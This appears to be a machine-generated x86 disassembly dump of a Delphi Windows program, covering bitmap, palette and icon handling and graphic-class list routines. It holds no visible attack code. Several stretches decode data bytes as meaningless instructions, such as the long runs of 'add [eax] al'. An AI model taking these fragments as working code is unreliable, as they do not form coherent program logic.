mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258e4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_425914
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c68
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c68
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_425908
xor edx edx
push ebp
push sub_425b02
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4257d4
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4257d4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_425adb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_408034
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_408034
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_408034
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_408034
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425840
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425840
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ae2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4027e4
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4027e4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4027e4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4027e4
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_425ae2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b09
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_425b10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_425b60
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_425bb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_425b60
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425c01
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40319c
mov edi eax
mov eax esi
call sub_40319c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425d3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425d1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_408160
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d25
mov al 0x1
sub_425d54
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c718
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425d9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425da3
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_425da8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_425ddc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c718
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425e27
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e2e
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_425e58
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
sbb al 0xa8
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
int3
inc ecx
add [ eax + 0x240041a4 ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] al
add [ eax ] al
add al 0x11
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebp + 0x5ecc0040 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pop esi
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x7e ] ch
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x60
inc edx
add al bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax + ebp * 4 ] bl
mov edx r-xdata
mov eax esi
call sub_426070
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426070
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fd4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc8
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425fcd
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403224
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426070
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_403578
sub_425ef0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425fcd
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403224
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_426070
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_426070
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_426070
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_426070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fd4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc8
retn
add esp 0xfffffff0
call sub_403578
sub_426070
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4260f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404d78
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40822c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403ff8
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403ff8
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_41a474
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4260fa
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_426104
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_404454
xor eax eax
push ebp
push sub_42618b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40822c
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40403c
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_41a5d0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4043b0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426192
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_42619c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42621a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41a5d0
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4031a4
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404208
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4043b0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426221
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42622c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4263ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403fa4
mov eax [ ebp + 0x8 ]
call sub_403fa4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403480
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263b2
lea eax [ ebp - 0x3c ]
call sub_403fa4
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_4092d0
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40426c
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_40426c
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_4092d0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4092d0
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_40885c
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403ff8
sub_426478
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_426524
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_426524
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_426524
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4264f8
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403254
mov eax [ esi + 0x8 ]
call sub_403254
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_426524
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_41a474
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426568
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41a474
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42658c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_41a5d0
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41a5d0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_426608
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
call sub_4265c8
call sub_4265e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_426648
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ab9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_426678
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40319c
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41acac
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_4266ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4033e0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403254
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403468
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403468
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403450
sub_426758
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_4267e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403254
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_40319c
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426808
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42692c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408abc
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404504
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_426104
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4268cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
mov eax [ ebx + 0xc ]
call sub_403254
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403468
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426933
lea eax [ ebp - 0x14 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_42693c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_42658c
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4269b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_424858
mov eax [ ebx + 0xc ]
call sub_403254
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403468
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403450
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_426a00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_426a74
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_426758
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_426758
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41abc8
mov edx ebx
mov eax esi
call sub_426758
jmp r-xdata
pop esi
pop ebx
retn
sub_426ad0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4265c8
mov ecx esi
mov edx ebx
call sub_426070
pop esi
pop ebx
pop ebp
retn 0x4
sub_426af4
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
